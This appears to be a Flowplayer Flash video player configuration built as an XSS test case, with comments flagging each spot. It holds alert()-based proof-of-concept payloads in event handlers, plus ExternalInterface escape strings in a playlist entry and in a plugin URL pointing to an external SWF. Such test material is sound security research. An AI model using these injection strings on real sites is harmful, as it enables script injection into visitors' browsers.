{
	'log' : {
		'level'  : 'info'
	},
	'clip': {
		'autoPlay': 'true',
		'baseUrl': 'http://stream.flowplayer.org/', /* Can load external objects - ExternalInterface issue */
		'onMyConnectionEvent': 'function(clip, info) {alert(/onMyConnectionEvent/)};', /* Possible issue in events */
		'onStart': 'function() {alert(/onBegin/);}' /* Possible issue in events */
	},
	'playlist': [ 
		'\\\"))}catch(e){};alert(/ExternalInterfaceXSSImURL2/);//' /* ExternalInterface issue */
	],
	'plugins': { 
		'controls': { 
			'url': 'http://0me.me/demo/xss/flash/normalEmbededXSS.swf?\\\"))}catch(e){};alert(/ExternalInterfaceXSSImURL1/);//' /* External object loading issue */
		}
	},
	'onLoad': 'function() {alert(/onLoad/);}', /* Possible issue in events */
	'connectionCallbacks': [ "onMyConnectionEvent" ] /* Possible issue in events */
}
